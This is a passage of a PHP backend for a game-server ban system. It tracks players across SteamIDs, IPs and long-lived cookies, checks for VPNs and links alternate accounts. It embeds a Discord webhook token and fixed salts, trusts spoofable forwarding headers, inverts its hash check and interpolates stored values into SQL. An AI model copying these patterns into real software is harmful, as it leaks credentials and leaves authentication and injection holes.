<?php
ignore_user_abort(true);
$rt_start = microtime(true);
$currtime = date('Y-m-d H:i:s');
$runtime = array();
$final_url = "http://194.180.16.153/ban_api/motd_herboy.html?ver122254123";
function running_time($functionname, $subtask)
{
    global $runtime, $rt_start;
    $current_time = microtime(true);
    $elapsed_time = $current_time - $rt_start;

    $runtime[] = [
        'functionname' => $functionname,
        'subtask' => $subtask,
        'time' => $elapsed_time
    ];

    // Reset start time for the next measurement
    $rt_start = $current_time;
}

$query_ran = 0;
function query_running()
{
    global $query_ran; $query_ran++;
}

define('DISCORD_WEBHOOK_URL', 'https://discord.com/api/webhooks/1262535786562195548/7jfKjHa6E04DqGYfzYVxvSi6z-ZIn63xnjDgn9F9uxwB_Eui_wZWUvoHrju7vrf1PN0f'); // Replace with your webhook URL
define('UUID_HASH_SALT', "AmxxBanSystemUUID__01918626-25ff-7cfb-b1ca-35fac8668745;");
define('URI_HASH_SALT', "AmxxBanSystemUUID__0191861d-564e-791f-b20f-047a8b7504c9");

ini_set('display_errors', '1');
ini_set('display_startup_errors', '1');
error_reporting(E_ALL);
$Errors = array();
$ThrowError = false;
$checked_uuids = array();

define('MAX_IP_AGE_DAYS', 7);
define('IP_API_RECHECK_DAYS', 7);


define('IND_CACHE', __DIR__ . '/black_n_whitelist.cache');
define('IND_UUID', 0);
define('IND_IP', 1);
define('IND_STEAMID', 2);
define('IND_ASN', 3);

define('PRX_CURRENT', 0);
define('PRX_LOCAL', 1);
define('PRX_SYNCED', 2);
$scope_map = [
    'current' => PRX_CURRENT,
    'local' => PRX_LOCAL,
    'synced' => PRX_SYNCED,
];

$Errors = array();  // Global array to store error messages

function finished()
{
    global $Errors, $ThrowError, $final_url;

    $ThrowError = true;
    checkExecution();

    // Log all errors before finishing
    if (!empty($Errors)) {
        foreach ($Errors as $error_message) {
            log_error_to_file($error_message);
        }
    }

    header("Location: ".$final_url);
    exit();
}
register_shutdown_function('finished');

function getRealIP()
{
    //return mt_rand(1, 255) . '.' . mt_rand(0, 255) . '.' . mt_rand(0, 255) . '.' . mt_rand(0, 255);

    if (isset($_SERVER["HTTP_CLIENT_IP"])) {
        $ip = $_SERVER["HTTP_CLIENT_IP"];
    } elseif (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {
        $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
    } elseif (isset($_SERVER["HTTP_X_FORWARDED"])) {
        $ip = $_SERVER["HTTP_X_FORWARDED"];
    } elseif (isset($_SERVER["HTTP_FORWARDED_FOR"])) {
        $ip = $_SERVER["HTTP_FORWARDED_FOR"];
    } elseif (isset($_SERVER["HTTP_FORWARDED"])) {
        $ip = $_SERVER["HTTP_FORWARDED"];
    } else {
        $ip = $_SERVER["REMOTE_ADDR"];
    }

    if (strpos($ip, ',') > 0) {
        $ip = substr($ip, 0, strpos($ip, ','));
    }
    return $ip;
}

function ErrorManager_Handler($errno, $errstr, $errfile, $errline)
{
    global $Errors, $ThrowError;

    // Error number to string mapping
    $error_types = [
        E_ERROR             => 'E_ERROR',
        E_WARNING           => 'E_WARNING',
        E_PARSE             => 'E_PARSE',
        E_NOTICE            => 'E_NOTICE',
        E_CORE_ERROR        => 'E_CORE_ERROR',
        E_CORE_WARNING      => 'E_CORE_WARNING',
        E_COMPILE_ERROR     => 'E_COMPILE_ERROR',
        E_COMPILE_WARNING   => 'E_COMPILE_WARNING',
        E_USER_ERROR        => 'E_USER_ERROR',
        E_USER_WARNING      => 'E_USER_WARNING',
        E_USER_NOTICE       => 'E_USER_NOTICE',
        E_STRICT            => 'E_STRICT',
        E_RECOVERABLE_ERROR => 'E_RECOVERABLE_ERROR',
        E_DEPRECATED        => 'E_DEPRECATED',
        E_USER_DEPRECATED   => 'E_USER_DEPRECATED',
        E_ALL               => 'E_ALL',
    ];

    if (strpos($errstr, "Implicit conversion from float") !== false) {
        return;
    }

    // Convert the error number to its string representation
    $errno_str = isset($error_types[$errno]) ? $error_types[$errno] : 'UNKNOWN_ERROR';

    $errfile = str_replace("\\", "/", $errfile);
    preg_match('/\$[0-9a-zA-Z:_-]*/', $errstr, $variable);

    $error_message = sprintf(
        "Error No: [%d] %s | Message: %s | File: %s | Line: %d | Variable: %s",
        $errno,
        $errno_str,
        str_replace($_SERVER['DOCUMENT_ROOT'] . "/", "", $errstr),
        str_replace($_SERVER['DOCUMENT_ROOT'] . "/", "", $errfile),
        $errline,
        empty($variable[0]) ? 'None' : implode(", ", $variable)
    );

    if(!$ThrowError)
        $Errors[] = $error_message;
}

set_error_handler("ErrorManager_Handler");

function triggerCustomError($errno, $errstr, $errfile = __FILE__, $errline = __LINE__)
{
    // Use the ErrorManager_Handler to log the error
    ErrorManager_Handler($errno, "[CUSTOM] ".$errstr, $errfile, $errline);
}

$localIp = getRealIP();
$g_steam = filter_input(INPUT_GET, 'st', FILTER_SANITIZE_FULL_SPECIAL_CHARS);
$g_ipv4 = filter_input(INPUT_GET, 'i', FILTER_SANITIZE_FULL_SPECIAL_CHARS);
$g_validator = filter_input(INPUT_GET, 'v', FILTER_VALIDATE_INT);
$g_server = filter_input(INPUT_GET, 'se', FILTER_VALIDATE_INT);
$gid = filter_input(INPUT_GET, 'gi', FILTER_VALIDATE_INT);
$local = "AmxxBanSystemUUID;{$g_steam};{$g_ipv4};{$g_validator};{$gid}";
$g_new = false;

if(md5($local) == $_GET['h'])
{
    triggerCustomError(E_USER_WARNING,'FAILED HASHCHECK URI', __FILE__, __LINE__);
    finished();
}

function log_error_to_file($log)
{
    global $g_steam, $localIp;

    $logDirectory = __DIR__."/logs/";
    $logFile = "ERROR_" . date('Y-m-d') . ".log";
    $logPath = $logDirectory . $logFile;

    // Ensure the log directory is writable
    if (!is_writable($logDirectory)) {
        error_log("Log directory is not writable: " . $logDirectory);
        return;
    }

    file_put_contents(
        $logPath,
        date('Y/m/d H:i:s'). " | " . $g_steam . " | " . $localIp . " | " . $log . "\n",
        FILE_APPEND
    );
}

switch ($g_server) {
    case 1:
        running_time("Switch Config", "config_avatar");
        require_once("config_avatar.php"); 
        break;
    case 2:
        running_time("Switch Config", "config_dev");
        require_once("config_dev.php"); 
        break;
    case 3:
        running_time("Switch Config", "config_herboy");
        require_once("config_herboy.php"); 
        break;
    case 4:
        running_time("Switch Config", "config_sdev");
        require_once("config_sdev.php"); 
        break;
    default:
        triggerCustomError(E_USER_WARNING,'UNKOWN SERVER ID ' . $g_server, __FILE__, __LINE__);
        finished();
}
require_once('_socket.php');
sck_set_server($skt_host,0);
//triggerCustomError(E_USER_WARNING,'FORCE REPORT', __FILE__, __LINE__);

$proxies = file('proxies.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

function get_via_proxy($url) {
    global $proxies;

    if (!$proxies) {
        throw new Exception("No proxies found in proxies.txt");
    }

    $proxy = $proxies[array_rand($proxies)];
    $proxy_user = '';
    $proxy_pass = '';

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$proxy_user:$proxy_pass");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);

    running_time("get_via_proxy", "curl_exec");
    $response = curl_exec($ch);

    if ($response === false) {
        throw new Exception('cURL Error: ' . curl_error($ch));
    }

    curl_close($ch);
    return $response;
}

function get_ip_data($checkip) {
    global $pdoban;

    try {
        $stmt = $pdoban->prepare("SELECT * FROM ip_data WHERE ip = :ip");
        $stmt->bindParam(':ip', $checkip);
        $stmt->execute();
        query_running();
        $result = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($result) {
            $check_date = new DateTime($result['check_date']);
            $current_date = new DateTime();
            $interval = $check_date->diff($current_date)->days;

            if ($interval < IP_API_RECHECK_DAYS) {
                $result['is_proxy'] = (bool)$result['is_proxy'];
                $result['is_vpn'] = (bool)$result['is_vpn'];
                $result['is_datacenter'] = (bool)$result['is_datacenter'];
                
                return $result;
            } else {
                $url = 'https://api.ipapi.is?q=' . $checkip;
                try {
                    running_time("get_ip_data", "get_via_proxy");
                    $content = get_via_proxy($url);
                } catch (Exception $e) {
                    triggerCustomError(E_USER_WARNING, "(proxy)get_ip_data('.$checkip.'): ".$e->getMessage(), $e->getFile(), $e->getLine());
                    try {
                        running_time("get_ip_data", "file_get_contents");
                        $content = file_get_contents($url);
                    } catch (Exception $e) {
                        triggerCustomError(E_USER_WARNING, "(normal)get_ip_data('.$checkip.'): ".$e->getMessage(), $e->getFile(), $e->getLine());
                        return $result;
                    }
                }

                $newdata = json_decode($content, true);

                $ip_data = [
                    'ip' => isset($newdata['ip']) ? $newdata['ip'] : $result['ip'],
                    'is_proxy' => isset($newdata['is_proxy']) ? (bool)$newdata['is_proxy'] : (bool)$result['is_proxy'],
                    'is_vpn' => isset($newdata['is_vpn']) ? (bool)$newdata['is_vpn'] : (bool)$result['is_vpn'],
                    'is_datacenter' => isset($newdata['is_datacenter']) ? (bool)$newdata['is_datacenter'] : (bool)$result['is_datacenter'],
                    'asn_asn' => isset($newdata['asn']['asn']) ? $newdata['asn']['asn'] : $result['asn_asn'],
                    'asn_route' => isset($newdata['asn']['route']) ? $newdata['asn']['route'] : $result['asn_route'],
                    'asn_org' => isset($newdata['asn']['org']) ? $newdata['asn']['org'] : $result['asn_org'],
                    'location_country_code' => isset($newdata['location']['country_code']) ? $newdata['location']['country_code'] : $result['location_country_code'],
                    'full_json' => $content,  // Always store the latest full JSON from the new data
                    'check_date' => date('Y-m-d H:i:s')
                ];

                running_time("get_ip_data", "update");
                $stmt = $pdoban->prepare("
                    UPDATE ip_data SET 
                        is_proxy = :is_proxy, 
                        is_vpn = :is_vpn, 
                        is_datacenter = :is_datacenter, 
                        asn_asn = :asn_asn, 
                        asn_route = :asn_route, 
                        asn_org = :asn_org, 
                        location_country_code = :location_country_code, 
                        full_json = :full_json,
                        check_date = :check_date
                    WHERE ip = :ip
                ");
                $stmt->execute($ip_data);
                query_running();

                return $ip_data;
            }
        } else {
            $url = 'https://api.ipapi.is?q=' . $checkip;
            try {
                running_time("get_ip_data", "get_via_proxy");
                $content = get_via_proxy($url);
            } catch (Exception $e) {
                triggerCustomError(E_USER_WARNING, "(proxy)get_ip_data('.$checkip.'): ".$e->getMessage(), $e->getFile(), $e->getLine());
                try {
                    running_time("get_ip_data", "file_get_contents");
                    $content = file_get_contents($url);
                } catch (Exception $e) {
                    triggerCustomError(E_USER_WARNING, "(normal)get_ip_data('.$checkip.'): ".$e->getMessage(), $e->getFile(), $e->getLine());
                    return null;
                }
            }

            $data = json_decode($content, true);

            $ip_data = [
                'ip' => isset($data['ip']) ? $data['ip'] : null,
                'is_proxy' => isset($data['is_proxy']) ? (bool)$data['is_proxy'] : false,
                'is_vpn' => isset($data['is_vpn']) ? (bool)$data['is_vpn'] : false,
                'is_datacenter' => isset($data['is_datacenter']) ? (bool)$data['is_datacenter'] : false,
                'asn_asn' => isset($data['asn']['asn']) ? $data['asn']['asn'] : null,
                'asn_route' => isset($data['asn']['route']) ? $data['asn']['route'] : null,
                'asn_org' => isset($data['asn']['org']) ? $data['asn']['org'] : null,
                'location_country_code' => isset($data['location']['country_code']) ? $data['location']['country_code'] : null,
                'full_json' => $content,
                'check_date' => date('Y-m-d H:i:s')
            ];

            running_time("get_ip_data", "insert");
            $stmt = $pdoban->prepare("
                INSERT INTO ip_data (
                    ip, is_proxy, is_vpn, is_datacenter, 
                    asn_asn, asn_route, asn_org, 
                    location_country_code, full_json, check_date
                ) VALUES (
                    :ip, :is_proxy, :is_vpn, :is_datacenter, 
                    :asn_asn, :asn_route, :asn_org, 
                    :location_country_code, :full_json, :check_date
                )
                ON DUPLICATE KEY UPDATE 
                    is_proxy = VALUES(is_proxy),
                    is_vpn = VALUES(is_vpn),
                    is_datacenter = VALUES(is_datacenter),
                    asn_asn = VALUES(asn_asn),
                    asn_route = VALUES(asn_route),
                    asn_org = VALUES(asn_org),
                    location_country_code = VALUES(location_country_code),
                    full_json = VALUES(full_json),
                    check_date = VALUES(check_date)
            ");
            $stmt->execute($ip_data);
            query_running();

            return $ip_data;
        }
    } catch (PDOException $e) {
        triggerCustomError(E_USER_WARNING, "Database error in get_ip_data('.$checkip.'): ".$e->getMessage(), $e->getFile(), $e->getLine());
        return null;
    }
}

function is_nonsteam($steamid)
{
    $parts = explode(':', $steamid);
    $matches = array();
    $isNonsteam = "";
    if (preg_match('#(\d+)$#', $parts[0], $matches)) {
        $isNonsteam = $matches[1];
        if((int)$isNonsteam > 1)
            $isNonsteam = "1";
    }
    if (preg_match('#(\d+)$#', $parts[1], $matches)) {
        if((int)$matches[1] > 1)
        $isNonsteam = "1";
    }

    return $isNonsteam == "1";
}

function base64url_encode($data) {
    return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
}

function base64url_decode($data) {
    return base64_decode(str_pad(strtr($data, '-_', '+/'), strlen($data) % 4, '=', STR_PAD_RIGHT));
}

function uuidv4()
{
    $data = random_bytes(16);
    $data[6] = chr(ord($data[6]) & 0x0f | 0x40); 
    $data[8] = chr(ord($data[8]) & 0x3f | 0x80); 
    return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
}

function encrypt_string($string) {
    $key = hash('sha256', URI_HASH_SALT, true);
    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
    
    $encryptedString = openssl_encrypt($string, 'aes-256-cbc', $key, 0, $iv);
    
    $result = base64_encode($iv . $encryptedString);
    
    return $result;
}

function decrypt_string($encryptedString) {
    $key = hash('sha256', URI_HASH_SALT, true);
    
    $data = base64_decode($encryptedString);
    $iv_length = openssl_cipher_iv_length('aes-256-cbc');
    $iv = substr($data, 0, $iv_length);
    $encryptedString = substr($data, $iv_length);
    
    $decryptedString = openssl_decrypt($encryptedString, 'aes-256-cbc', $key, 0, $iv);
    
    return $decryptedString;
}

function add_steamid(&$array, $steamid)
{
    global $currtime;

    $found = false;
    foreach ($array['STEAMIDs'] as &$steamid_data) { 
        if (isset($steamid_data['indicator']) && $steamid_data['indicator'] === $steamid) {
            $steamid_data['lastseen'] = $currtime;
            $found = true;
            break;
        }
    }

    if (!$found) {
        $aIndicator = array(
            'indicator' => $steamid,
            'firstseen' => $currtime,
            'lastseen' => $currtime,
            'is_nonsteam' => is_nonsteam($steamid),
            'is_sync' => false,
        );

        $array['STEAMIDs'][] = $aIndicator;
    }
}

function add_ip(&$player_cluster, $ip, $last = PHP_INT_MAX)
{
    global $currtime;

    if (is_string($last) && strtotime($last) !== false) {
        $last_seen_date = new DateTime($last);
        $current_date = new DateTime($currtime);
        $interval = $last_seen_date->diff($current_date)->days;

        // If the last update was within the recheck days threshold, return
        if ($interval < IP_API_RECHECK_DAYS) {
            return;
        }
    }

    $ip_data = get_ip_data($ip);

    if ($ip_data === null) {
        $ip_data = [
            'ip' => $ip,
            'firstseen' => $currtime,
            'lastseen' => $currtime
        ];
    }

    $found = false;
    foreach ($player_cluster['IPs'] as &$ip_entry) {
        if (isset($ip_entry['indicator']) && $ip_entry['indicator'] === $ip_data['ip']) {
            $ip_entry['lastseen'] = $currtime;

            if (isset($ip_data['is_proxy'])) {
                $ip_entry['is_proxy'] = $ip_data['is_proxy'];
            }
            if (isset($ip_data['is_vpn'])) {
                $ip_entry['is_vpn'] = $ip_data['is_vpn'];
            }
            if (isset($ip_data['is_datacenter'])) {
                $ip_entry['is_datacenter'] = $ip_data['is_datacenter'];
            }
            if (isset($ip_data['asn_asn'])) {
                $ip_entry['asn_asn'] = $ip_data['asn_asn'];
            }
            if (isset($ip_data['asn_route'])) {
                $ip_entry['asn_route'] = $ip_data['asn_route'];
            }
            if (isset($ip_data['asn_org'])) {
                $ip_entry['asn_org'] = $ip_data['asn_org'];
            }
            if (isset($ip_data['location_country_code'])) {
                $ip_entry['location_country_code'] = $ip_data['location_country_code'];
            }

            $found = true;
            break;
        }
    }

    if (!$found) {
        $new_ip_entry = array(
            'indicator' => isset($ip_data['ip']) ? $ip_data['ip'] : $ip,
            'firstseen' => $currtime,
            'lastseen' => $currtime,
            'is_proxy' => isset($ip_data['is_proxy']) ? $ip_data['is_proxy'] : null,
            'is_vpn' => isset($ip_data['is_vpn']) ? $ip_data['is_vpn'] : null,
            'is_datacenter' => isset($ip_data['is_datacenter']) ? $ip_data['is_datacenter'] : null,
            'asn_asn' => isset($ip_data['asn_asn']) ? $ip_data['asn_asn'] : null,
            'asn_route' => isset($ip_data['asn_route']) ? $ip_data['asn_route'] : null,
            'asn_org' => isset($ip_data['asn_org']) ? $ip_data['asn_org'] : null,
            'location_country_code' => isset($ip_data['location_country_code']) ? $ip_data['location_country_code'] : null,
            'is_sync' => false,
        );

        $player_cluster['IPs'][] = $new_ip_entry;
    }
}

function store_player_cluster($player_cluster)
{
    global $pdoban;

    $data_json = json_encode([
        'STEAMIDs'      => $player_cluster['STEAMIDs'],
        'IPs'           => $player_cluster['IPs'],
        'ACCOUNTs'      => $player_cluster['ACCOUNTs'],
        'PAIRs'         =>$player_cluster['PAIRs'],
        'OLDUKEY'       =>$player_cluster['OLDUKEY'],
        'USERAGENTs'    =>$player_cluster['USERAGENTs'],
        'PUNISHLOGs'    =>$player_cluster['PUNISHLOGs']
    ], JSON_UNESCAPED_SLASHES);

    running_time("store_player_cluster", "prepare");
    $stmt = $pdoban->prepare("
        INSERT INTO amx_cookie_v2 (UUID, firstseen, lastseen, data)
        VALUES (:uuid, :firstseen, :lastseen, :data)
        ON DUPLICATE KEY UPDATE
            lastseen = :lastseen,
            data = :data
    ");

    running_time("store_player_cluster","execute");
    $stmt->execute([
        ':uuid' => $player_cluster['UUID'],
        ':firstseen' => $player_cluster['firstseen'],
        ':lastseen' => $player_cluster['lastseen'],
        ':data' => $data_json
    ]);
    running_time("store_player_cluster","executed");
    query_running();
}

function create_player_cluster(&$player_cluster, $g_steam, $g_ipv4, $localIp, $currtime, $cookiename) {
    global $g_new;

    $player_cluster = array(
        'UUID'          => uuidv4(),
        'firstseen'     => $currtime,
        'lastseen'      => $currtime,
        'STEAMIDs'      => array(),
        'IPs'           => array(),
        'ACCOUNTs'      => array(),
        'PAIRs'         => array(),
        'OLDUKEY'       => array(),
        'USERAGENTs'    => array(),
        'PUNISHLOGs'    => array()
    );

    running_time("create_player_cluster", "add_steamid");
    add_steamid($player_cluster, $g_steam);
    running_time("create_player_cluster", "add_ip (g_ipv4)");
    add_ip($player_cluster, $g_ipv4);

    if($g_ipv4 != $localIp) {
        running_time("create_player_cluster", "add_ip (localIp)");
        add_ip($player_cluster, $localIp);
    }

    running_time("create_player_cluster", "encrypt_string");
    $encrypted_uuid = encrypt_string($player_cluster['UUID']);
    $cookie_content = [
        "UUID" => $encrypted_uuid,
        "HASHCHECK" => hash('sha256', UUID_HASH_SALT . $encrypted_uuid)
    ];

    setcookie(($cookiename), base64url_encode(serialize($cookie_content)), time()+60*60*24*365*10 );
}

function get_player_cluster($uuid, &$player_cluster)
{
    global $pdoban, $cookiename, $g_steam, $g_ipv4, $localIp, $currtime, $cookiename;

    running_time("get_player_cluster", "prepare");
    $stmt = $pdoban->prepare("SELECT * FROM amx_cookie_v2 WHERE UUID = :uuid");
    $stmt->execute([':uuid' => $uuid]);
    running_time("get_player_cluster", "execute");
    query_running();

    $result = $stmt->fetch(PDO::FETCH_ASSOC);
    running_time("get_player_cluster", "fetched");

    if ($result) {
        $data = json_decode($result['data'], true);
    
        $player_cluster = [
            'UUID'          => $result['UUID'],
            'firstseen'     => $result['firstseen'],
            'lastseen'      => $result['lastseen'],
            'STEAMIDs'      => $data['STEAMIDs'],
            'IPs'           => $data['IPs'],
            'ACCOUNTs'      => $data['ACCOUNTs'],
            'PAIRs'         => $data['PAIRs'],
            'OLDUKEY'       => $data['OLDUKEY'],
            'USERAGENTs'    => $data['USERAGENTs'],
            'PUNISHLOGs'    => $data['PUNISHLOGs']
        ];
    } else {
        triggerCustomError(E_USER_WARNING,'UUID not found: ' . $uuid, __FILE__, __LINE__);
        create_player_cluster($player_cluster, $g_steam, $g_ipv4, $localIp, $currtime, $cookiename);
    }
}

function get_matching_ban_bids($indicators) {
    global $pdo;

    if (empty($indicators)) {
        return [];
    }

    // Separate IPs and STEAMIDs into two different arrays
    $ips = [];
    $steamids = [];

    foreach ($indicators as $indicator) {
        if ($indicator['type'] == IND_IP) {
            $ips[] = $indicator['value'];
        } elseif ($indicator['type'] == IND_STEAMID) {
            $steamids[] = $indicator['value'];
        }
    }

    if (empty($ips) && empty($steamids)) {
        return [];
    }

    // Prepare the SQL query
    $placeholders_ip = implode(',', array_fill(0, count($ips), '?'));
    $placeholders_steamid = implode(',', array_fill(0, count($steamids), '?'));

    try {
        running_time("get_matching_ban_bids", "prepare");
        $stmt = $pdo->prepare("
            SELECT
                bid
            FROM
                amx_bans
            WHERE
                (
                    (player_ip IN ($placeholders_ip)) OR
                    (player_id IN ($placeholders_steamid))
                ) AND 
                expired = 0 AND 
                (ban_length = 0 OR 
                (ban_length > 0 AND (ban_created + (ban_length * 60)) > UNIX_TIMESTAMP(DATE_SUB(NOW(), INTERVAL ? DAY))))
        ");

        // Bind IPs and STEAMIDs to the query
        $i = 1;
        foreach ($ips as $ip) {
            $stmt->bindValue($i++, $ip, PDO::PARAM_STR);
        }
        foreach ($steamids as $steamid) {
            $stmt->bindValue($i++, $steamid, PDO::PARAM_STR);
        }
        $stmt->bindValue($i, MAX_IP_AGE_DAYS, PDO::PARAM_INT);

        running_time("get_matching_ban_bids", "execute");
        $stmt->execute();
        running_time("get_matching_ban_bids", "fetched");
        query_running();
        $results = $stmt->fetchAll(PDO::FETCH_COLUMN, 0);

        return $results ?: [];

    } catch (PDOException $e) {
        triggerCustomError(E_USER_WARNING, 'Database error in get_matching_ban_bids: ' . $e->getMessage(), $e->getFile(), $e->getLine());
        return [];
    }
}

function check_for_steamid_changer($player_cluster, $g_steamid)
{
    $g_is_nonsteam = is_nonsteam($g_steamid);
    if (!$g_is_nonsteam) {
        return false;
    }

    $oldest_firstseen_nonsteamid = PHP_INT_MAX; 
    $g_steamid_firstseen = null;

    foreach ($player_cluster['STEAMIDs'] as $steamid_entry) {
        if($steamid_entry['is_sync'] === true)
            continue;
        if ($steamid_entry['is_nonsteam'] && $steamid_entry['firstseen'] < $oldest_firstseen_nonsteamid) {
            $oldest_firstseen_nonsteamid = $steamid_entry['firstseen'];
        }

        if ($steamid_entry['indicator'] === $g_steamid) {
            $g_steamid_firstseen = $steamid_entry['firstseen'];
        }
    }

    if ($oldest_firstseen_nonsteamid !== PHP_INT_MAX && $g_steamid_firstseen !== null) {
        if ($g_steamid_firstseen > $oldest_firstseen_nonsteamid) {
            return true;
        }
    }

    return false;
}

function check_vpn_or_proxy($player_cluster, $localIp, $g_ipv4)
{
    foreach ($player_cluster['IPs'] as $ip_entry) {
        if ($ip_entry['indicator'] === $localIp || $ip_entry['indicator'] === $g_ipv4) {
            if ($ip_entry['is_datacenter'] === true || $ip_entry['is_vpn'] === true || $ip_entry['is_proxy'] === true) {
                return true;
            }
        }
    }

    return false;
}

function check_vpn_or_proxy_idc($indicator)
{
    if(isset($indicator['is_datacenter']) && $indicator['is_datacenter'] === true)
        return true;
    elseif(isset($indicator['is_vpn']) && $indicator['is_vpn'] === true)
        return true;
    elseif(isset($indicator['is_proxy']) && $indicator['is_proxy'] === true)
        return true;

    return false;
}

function store_uuid_pair($uuid1, $uuid2, $pair_time, $matched_value)
{
    global $pdoban;

    try {
        if (strcmp($uuid1, $uuid2) > 0) {
            list($uuid1, $uuid2) = [$uuid2, $uuid1];
        }

        $id = md5($uuid1 . $uuid2);
        $stmt = $pdoban->prepare("
            INSERT INTO amx_cookie_pair (id, UUID1, UUID2, pair_time, matched_value)
            VALUES (:id, :uuid1, :uuid2, :pair_time, :matched_value)
            ON DUPLICATE KEY UPDATE 
                pair_time = :pair_time,
                matched_value = :matched_value
        ");
        $stmt->bindParam(':id', $id, PDO::PARAM_STR);
        $stmt->bindParam(':uuid1', $uuid1, PDO::PARAM_STR);
        $stmt->bindParam(':uuid2', $uuid2, PDO::PARAM_STR);
        $stmt->bindParam(':pair_time', $pair_time, PDO::PARAM_STR);
        $stmt->bindParam(':matched_value', $matched_value, PDO::PARAM_STR);
        $stmt->execute();
        query_running();

    } catch (PDOException $e) {
        triggerCustomError(E_USER_WARNING, 'Database error in store_uuid_pair: ' . $e->getMessage(), $e->getFile(), $e->getLine());
    }
}

function sync_indicators(&$player_cluster, &$chainstate, &$queriedIndicators, &$checked_uuids) {
    global $pdoban, $currtime;

    // Combine STEAMIDs and IPs into a single array and remove any that have already been queried
    $Indicators = array_diff(array_merge(
        array_column($player_cluster['STEAMIDs'], 'indicator'),
        array_column($player_cluster['IPs'], 'indicator')
    ), $queriedIndicators);

    if (empty($Indicators)) {
        return;
    }

    // Prepare the query
    $query = "
        SELECT UUID, steamid_indicators, ip_indicators, data
        FROM amx_cookie_v2
        WHERE 
    ";

    // Add conditions for STEAMIDs and IPs using LIKE
    $conditions = [];
    foreach ($Indicators as $indicator) {
        if(!check_vpn_or_proxy_idc($indicator))
        {
            $escaped_indicator = $pdoban->quote("%$indicator%");
            $conditions[] = "(steamid_indicators LIKE $escaped_indicator OR ip_indicators LIKE $escaped_indicator)";
        }
    }
    $query .= implode(' OR ', $conditions);

    // Include the UUIDs from the player's PAIRs
    if (!empty($player_cluster['PAIRs'])) {
        $pairConditions = implode(' OR ', array_map(function ($uuid) {
            return "UUID = '$uuid'";
        }, $player_cluster['PAIRs']));
        $query .= " OR ($pairConditions)";
    }

    $stmt = $pdoban->prepare($query);
    $stmt->execute();
    query_running();
    $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
    // Mark these indicators as queried
    $queriedIndicators = array_merge($queriedIndicators, $Indicators);

    foreach ($results as $result) {
        $uuid = $result['UUID'];
        if (in_array($uuid, $checked_uuids)) {
            continue; // Skip already checked UUIDs
        }

        $checked_uuids[] = $uuid;
        $player_cluster['PAIRs'][] = $uuid;
        $data = json_decode($result['data'], true);

        if (isset($data['PAIRs'])) {
            $player_cluster['PAIRs'] = array_unique(array_merge($player_cluster['PAIRs'], $data['PAIRs']));
        }

        foreach ($data['STEAMIDs'] as &$steamid_entry) {
            if (!$steamid_entry['is_sync'] && !in_array($steamid_entry['indicator'], array_column($player_cluster['STEAMIDs'], 'indicator'))) {
                // Sync STEAMID only if it doesn't exist in the user's indicators
                $new_chainstate = array_merge($chainstate, [
                    [
                        'uuid' => $uuid,
                        'sync_value' => $steamid_entry['indicator']
                    ]
                ]);

                if (!in_array($uuid, $player_cluster['PAIRs'])) {
                    $player_cluster['PAIRs'][] = $uuid;
                }
                store_uuid_pair($player_cluster['UUID'], $uuid, $currtime, $steamid_entry['indicator']);

                $steamid_entry['is_sync'] = true;
                $steamid_entry['sync_time'] = $currtime;
                $steamid_entry['sync_chain'] = $new_chainstate;
                $player_cluster['STEAMIDs'][] = $steamid_entry;

                // Recur to sync newly found indicators
                sync_indicators($player_cluster, $new_chainstate, $queriedIndicators, $checked_uuids);
            }
        }

        foreach ($data['IPs'] as &$ip_entry) {
            if (!$ip_entry['is_sync'] && !in_array($ip_entry['indicator'], array_column($player_cluster['IPs'], 'indicator'))) {
                // Sync IP only if it doesn't exist in the user's indicators
                $new_chainstate = array_merge($chainstate, [
                    [
                        'uuid' => $uuid,
                        'sync_value' => $ip_entry['indicator']
                    ]
                ]);

                if (!in_array($uuid, $player_cluster['PAIRs'])) {
                    $player_cluster['PAIRs'][] = $uuid;
                }
                store_uuid_pair($player_cluster['UUID'], $uuid, $currtime, $ip_entry['indicator']);

                $ip_entry['is_sync'] = true;
                $ip_entry['sync_time'] = $currtime;
                $ip_entry['sync_chain'] = $new_chainstate;
                $player_cluster['IPs'][] = $ip_entry;
                add_ip($player_cluster, $ip_entry['indicator'], $ip_entry['lastseen']);

                // Recur to sync newly found indicators
                sync_indicators($player_cluster, $new_chainstate, $queriedIndicators, $checked_uuids);
            }
        }
    }
}

function load_local_whitelist_blacklist_cache() {
    if (file_exists(IND_CACHE)) {
        return include(IND_CACHE);
    }
    return [];
}

function save_local_whitelist_blacklist_cache($data) {
    file_put_contents(IND_CACHE, '<?php return ' . var_export($data, true) . ';');
}

function update_IND_CACHE_if_needed() {
    global $pdoban;
    $IND_CACHE = load_local_whitelist_blacklist_cache();
    
    // Get the most recent updated_at timestamp and the count of records
    running_time("update_IND_CACHE", "get_last_update");
    $stmt = $pdoban->prepare("
        SELECT MAX(updated_at) as last_update, COUNT(*) as record_count 
        FROM amx_whitelist_blacklist
        WHERE id != 0
    ");
    $stmt->execute();
    query_running();
    $result = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$IND_CACHE || $IND_CACHE['last_update_time'] < $result['last_update']) {
        // Cache is outdated or doesn't exist, update it
        running_time("update_IND_CACHE", "fetch_all_records");
        $stmt = $pdoban->prepare("
            SELECT * 
            FROM amx_whitelist_blacklist 
            WHERE id != 0 
            ORDER BY priority DESC, is_whitelist DESC
        ");
        $stmt->execute();
        query_running();
        $records = $stmt->fetchAll(PDO::FETCH_ASSOC);

        $IND_CACHE = [
            'last_update_time' => $result['last_update'],
            'total_records' => $result['record_count'],
            'records' => $records
        ];

        save_local_whitelist_blacklist_cache($IND_CACHE);
    }

    return $IND_CACHE['records'];
}

function ip_in_range($ip, $cidr) {
    list($subnet, $mask) = explode('/', $cidr);
    return (ip2long($ip) & ~((1 << (32 - $mask)) - 1)) == ip2long($subnet);
}

function update_new_loginkey($oldkey, $uuid)
{
    global $pdoreg;

    try {
        // Prepare the SQL statement to update the LoginKey
        running_time("update_new_loginkey", "prepare");
